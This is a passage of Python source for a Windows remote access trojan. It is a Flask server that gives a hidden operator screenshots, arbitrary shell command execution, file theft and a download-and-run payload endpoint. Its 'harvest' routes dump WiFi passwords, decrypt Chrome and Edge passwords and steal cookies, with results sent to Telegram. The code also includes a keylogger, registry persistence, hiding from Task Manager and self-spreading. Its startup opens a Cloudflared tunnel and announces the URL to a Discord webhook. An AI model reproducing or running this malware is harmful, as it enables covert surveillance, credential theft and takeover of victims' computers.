            return Response('', status=500)

def _get_monitor_list():
    """Get list of monitors for cropping."""
    try:
        import ctypes
        monitors = []
        class RECT(ctypes.Structure):
            _fields_ = [('left', ctypes.c_long), ('top', ctypes.c_long),
                        ('right', ctypes.c_long), ('bottom', ctypes.c_long)]
        
        def callback(hMonitor, hdcMonitor, lprcMonitor, dwData):
            rect = lprcMonitor.contents
            monitors.append({
                'id': len(monitors),
                'left': rect.left, 'top': rect.top,
                'right': rect.right, 'bottom': rect.bottom,
                'width': rect.right - rect.left,
                'height': rect.bottom - rect.top
            })
            return True
        
        MONITORENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p,
                                             ctypes.c_void_p, ctypes.POINTER(RECT), ctypes.c_double)
        ctypes.windll.user32.EnumDisplayMonitors(None, None,
            MONITORENUMPROC(callback), 0)
        return monitors
    except:
        return [{'id': 0, 'left': 0, 'top': 0, 'right': 1920, 'bottom': 1080, 'width': 1920, 'height': 1080}]

@app.route('/api/screen/capture')
def screen_capture():
    """Capture single screenshot."""
    try:
        from PIL import ImageGrab
        monitor_id = int(request.args.get('monitor', -1))
        if monitor_id >= 0:
            img = ImageGrab.grab(all_screens=True)
            mons = _get_monitor_list()
            if monitor_id < len(mons):
                m = mons[monitor_id]
                img = img.crop((m['left'], m['top'], m['right'], m['bottom']))
        else:
            img = ImageGrab.grab(all_screens=True)
        img_io = io.BytesIO()
        img.save(img_io, 'JPEG')
        img_io.seek(0)
        return Response(img_io.read(), mimetype='image/jpeg')
    except:
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            img_io = io.BytesIO()
            img.save(img_io, 'JPEG')
            img_io.seek(0)
            return Response(img_io.read(), mimetype='image/jpeg')
        except:
            return Response('', status=500)

@app.route('/api/system/info')
def system_info():
    """Get system information."""
    try:
        import platform
        info = {
            'system': platform.system(),
            'node': platform.node(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor()
        }
        return jsonify(info)
    except:
        return jsonify({})

@app.route('/api/system/processes')
def system_processes():
    """Get running processes."""
    try:
        result = subprocess.run(['tasklist'], capture_output=True, text=True, creationflags=0x08000000)
        return jsonify({'processes': result.stdout.split('\n')})
    except:
        return jsonify({'processes': []})

@app.route('/api/files/list', methods=['POST'])
def list_files():
    """List files in directory."""
    try:
        data = request.get_json()
        path = data.get('path', 'C:\\')
        if os.path.exists(path):
            files = os.listdir(path)
            return jsonify({'files': files})
        return jsonify({'files': []})
    except:
        return jsonify({'files': []})

@app.route('/api/files/download')
def download_file():
    """Download file."""
    try:
        path = request.args.get('path', '')
        if os.path.exists(path) and os.path.isfile(path):
            return send_file(path, as_attachment=True)
        return Response('', status=404)
    except:
        return Response('', status=500)

@app.route('/api/command/execute', methods=['POST'])
def execute_command():
    """Execute system command."""
    try:
        data = request.get_json()
        cmd = data.get('command', '')
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=0x08000000)
        return jsonify({'output': result.stdout + result.stderr})
    except Exception as e:
        return jsonify({'output': str(e)})

@app.route('/api/hardware/check')
def hardware_check():
    """Check available hardware."""
    hardware = {
        'webcam': False,
        'microphone': False,
        'screen': True,
        'speakers': False
    }
    
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        hardware['webcam'] = cap.isOpened()
        cap.release()
    except:
        pass
    
    try:
        import pyaudio
        p = pyaudio.PyAudio()
        hardware['microphone'] = p.get_device_count() > 0
        p.terminate()
    except:
        pass
    
    try:
        import winsound
        hardware['speakers'] = True
    except:
        pass
    
    return jsonify(hardware)

@app.route('/api/files/upload', methods=['POST'])
def upload_file():
    """Upload file to host."""
    try:
        if 'file' not in request.files:
            return jsonify({'success': False, 'error': 'No file'})
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'success': False, 'error': 'No filename'})
        
        upload_path = os.path.join(script_dir, file.filename)
        file.save(upload_path)
        return jsonify({'success': True, 'path': upload_path})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ============================================================================
# NEW API ENDPOINTS - Data Harvesting, Remote Control, Troll, Stealth
# ============================================================================

@app.route('/api/harvest/wifi')
def harvest_wifi():
    """Dump all saved WiFi passwords."""
    try:
        passwords = _dump_wifi_passwords()
        return jsonify({'success': True, 'passwords': passwords})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/harvest/chrome')
def harvest_chrome():
    """Decrypt Chrome saved passwords."""
    try:
        passwords = _decrypt_chrome_passwords()
        return jsonify({'success': True, 'passwords': passwords})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/harvest/edge')
def harvest_edge():
    """Decrypt Edge saved passwords."""
    try:
        passwords = _decrypt_edge_passwords()
        return jsonify({'success': True, 'passwords': passwords})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/harvest/cookies')
def harvest_cookies():
    """Steal browser cookies."""
    try:
        cookies = _steal_browser_cookies()
        return jsonify({'success': True, 'cookies': cookies})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/harvest/software')
def harvest_software():
    """Get installed software list."""
    try:
        software = _get_installed_software()
        return jsonify({'success': True, 'software': software})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/harvest/recent')
def harvest_recent():
    """Get recent documents."""
    try:
        docs = _get_recent_documents()
        return jsonify({'success': True, 'documents': docs})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/harvest/inventory')
def harvest_inventory():
    """Get full system inventory."""
    try:
        inventory = _get_system_inventory()
        return jsonify({'success': True, 'inventory': inventory})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/harvest/send_telegram', methods=['POST'])
def harvest_send_telegram():
    """Send harvested data to Telegram."""
    try:
        data = request.get_json()
        harvest_type = data.get('type', '')
        text = data.get('text', '')
        if text:
            success = _send_telegram(text)
            return jsonify({'success': success})
        return jsonify({'success': False, 'error': 'No text provided'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remote/download_exec', methods=['POST'])
def remote_download_exec():
    """Download a file from URL and execute it."""
    try:
        data = request.get_json()
        url = data.get('url', '')
        if not url:
            return jsonify({'success': False, 'error': 'No URL'})
        filename = url.split('/')[-1] or 'payload.exe'
        save_path = os.path.join(KEYLOG_DIR, filename)
        resp = requests.get(url, timeout=60, allow_redirects=True)
        with open(save_path, 'wb') as f:
            f.write(resp.content)
        subprocess.Popen([save_path], creationflags=0x08000000, close_fds=True)
        return jsonify({'success': True, 'path': save_path})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remote/self_update', methods=['POST'])
def remote_self_update():
    """Download new version and replace current executable."""
    try:
        if not UPDATE_URL:
            return jsonify({'success': False, 'error': 'No UPDATE_URL configured'})
        new_exe_path = os.path.join(KEYLOG_DIR, "_update.exe")
        resp = requests.get(UPDATE_URL, timeout=120, allow_redirects=True)
        with open(new_exe_path, 'wb') as f:
            f.write(resp.content)
        bat_path = os.path.join(KEYLOG_DIR, "_updater.bat")
        current_exe = sys.executable if getattr(sys, 'frozen', False) else ""
        if not current_exe:
            return jsonify({'success': False, 'error': 'Not running as exe'})
        with open(bat_path, 'w') as bf:
            bf.write(f'''@echo off
timeout /t 3 /nobreak >nul
taskkill /f /im "{os.path.basename(current_exe)}" >nul 2>&1
copy /y "{new_exe_path}" "{current_exe}" >nul 2>&1
start "" "{current_exe}"
del /f /q "{bat_path}" >nul 2>&1
del /f /q "{new_exe_path}" >nul 2>&1
''')
        subprocess.Popen(['cmd', '/c', bat_path], creationflags=0x08000000, close_fds=True)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remote/file_search', methods=['POST'])
def remote_file_search():
    """Search for files on host."""
    try:
        data = request.get_json()
        root = data.get('root', 'C:\\')
        pattern = data.get('pattern', '')
        if not pattern:
            return jsonify({'success': False, 'error': 'No pattern'})
        results = _search_files(root, pattern)
        return jsonify({'success': True, 'results': results})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remote/browser_open', methods=['POST'])
def remote_browser_open():
    """Open URL in victim's default browser."""
    try:
        data = request.get_json()
        url = data.get('url', '')
        if not url:
            return jsonify({'success': False, 'error': 'No URL'})
        os.startfile(url)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remote/process_kill', methods=['POST'])
def remote_process_kill():
    """Kill a process by name."""
    try:
        data = request.get_json()
        name = data.get('name', '')
        if not name:
            return jsonify({'success': False, 'error': 'No process name'})
        result = subprocess.run(['taskkill', '/f', '/im', name], capture_output=True, text=True, creationflags=0x08000000)
        return jsonify({'success': result.returncode == 0, 'output': result.stdout + result.stderr})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/troll/mouse_jitter', methods=['POST'])
def troll_mouse_jitter():
    """Start/stop random mouse jittering."""
    try:
        data = request.get_json()
        action = data.get('action', 'start')
        if action == 'start':
            def _jitter_loop():
                from pynput.mouse import Controller
                mouse = Controller()
                while getattr(_jitter_loop, 'running', True):
                    try:
                        import random as _r
                        dx = _r.randint(-50, 50)
                        dy = _r.randint(-50, 50)
                        pos = mouse.position
                        mouse.position = (pos[0] + dx, pos[1] + dy)
                        time.sleep(_r.uniform(0.5, 3.0))
                    except:
                        break
            _jitter_loop.running = True
            threading.Thread(target=_jitter_loop, daemon=True).start()
            return jsonify({'success': True})
        else:
            _jitter_loop.running = False
            return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/troll/ghost_type', methods=['POST'])
def troll_ghost_type():
    """Type random text or custom message on host."""
    try:
        data = request.get_json()
        text = data.get('text', 'Hello? Is anyone there?')
        interval = data.get('interval', 2.0)
        count = data.get('count', 1)
        def _ghost_loop():
            from pynput.keyboard import Controller
            kb = Controller()
            for _ in range(count):
                time.sleep(interval)
                kb.type(text)
        threading.Thread(target=_ghost_loop, daemon=True).start()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/troll/wallpaper', methods=['POST'])
def troll_wallpaper():
    """Change desktop wallpaper."""
    try:
        image_file = request.files.get('image')
        if not image_file:
            return jsonify({'success': False, 'error': 'No image'})
        img_data = image_file.read()
        tmp_path = os.path.join(KEYLOG_DIR, "_wallpaper.bmp")
        with open(tmp_path, 'wb') as f:
            f.write(img_data)
        import ctypes
        ctypes.windll.user32.SystemParametersInfoW(20, 0, tmp_path, 3)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/troll/monitor', methods=['POST'])
def troll_monitor():
    """Turn monitor on/off."""
    try:
        data = request.get_json()
        action = data.get('action', 'off')
        import ctypes
        if action == 'off':
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        else:
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
            ctypes.windll.user32.SetCursorPos(0, 0)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/stealth/spread')
def stealth_spread():
    """Spread internally to hidden locations."""
    try:
        count = _spread_internally()
        return jsonify({'success': True, 'copies': count})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/stealth/registry')
def stealth_registry():
    """Add registry persistence."""
    try:
        success = _add_registry_persistence()
        return jsonify({'success': success})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/network/lan_scan')
def network_lan_scan():
    """Scan local network for devices."""
    try:
        def _scan_async():
            devices = _scan_lan()
            return devices
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(_scan_async)
            devices = future.result(timeout=60)
        return jsonify({'success': True, 'devices': devices})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

def find_free_port() -> int:
    """Find a random free port."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        s.listen(1)
        port = s.getsockname()[1]
    return port

def post_to_discord(url: str) -> bool:
    """Post the Cloudflared URL to Discord webhook."""
    try:
        # Get host IP
        host_ip = "Unknown"
        try:
            hostname = socket.gethostname()
            local_ips = socket.gethostbyname_ex(hostname)[2]
            for ip in local_ips:
                if not ip.startswith('127.') and not ip.startswith('169.254.'):
                    host_ip = ip
                    break
        except:
            pass
        
        data = {
            "content": f"IGR - {host_ip}\n{url}",
            "username": DISCORD_USERNAME
        }
        
        response = requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=10)
        response.raise_for_status()
        return True
    except Exception:
        return False

def start_cloudflared(port: int) -> Optional[str]:
    """Start Cloudflared tunnel and return the public URL."""
    try:
        cmd = [CLOUDFLARED_PATH, "tunnel", "--url", f"http://localhost:{port}", "--loglevel", "info"]
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            creationflags=0x08000000
        )
        
        start_time = time.time()
        
        try:
            for line in iter(process.stdout.readline, ''):
                line = line.strip()
                if 'https://' in line and '.trycloudflare.com' in line:
                    url = line.split('https://')[1].split()[0]
                    return f"https://{url}"
                if time.time() - start_time > 20:
                    break
        except:
            pass
        
        return None
        
    except Exception:
        return None

def main():
    """Main function to set up and run the service."""
    has_discord = DISCORD_WEBHOOK_URL and not DISCORD_WEBHOOK_URL.startswith("BUILD_")
    has_telegram = TELEGRAM_BOT_TOKEN and not TELEGRAM_BOT_TOKEN.startswith("BUILD_") and TELEGRAM_CHAT_ID and not TELEGRAM_CHAT_ID.startswith("BUILD_")

    if not has_discord and not has_telegram:
        return
    
    # Stealth: hide from task manager
    _hide_from_taskmanager()
    
    # Stealth: add registry persistence
    _add_registry_persistence()
    
    # Stealth: spread internally (only when compiled)
    _spread_internally()
    
    # Start keylogger on backend startup
    start_keylogger()
    
    # Start watchdog
    _start_watchdog()
    
    port = find_free_port()
    global CLOUDFLARED_PUBLIC_URL
    CLOUDFLARED_PUBLIC_URL = start_cloudflared(port) or ""
    
    if CLOUDFLARED_PUBLIC_URL:
        if has_discord:
            post_to_discord(CLOUDFLARED_PUBLIC_URL)
        if has_telegram:
            _send_telegram_full_report(CLOUDFLARED_PUBLIC_URL)
            threading.Thread(target=_telegram_heartbeat, args=(CLOUDFLARED_PUBLIC_URL,), daemon=True).start()
    
    try:
        app.run(host=SERVICE_HOST, port=port, debug=False, use_reloader=False)
    except Exception:
        pass

if __name__ == "__main__":
    main()
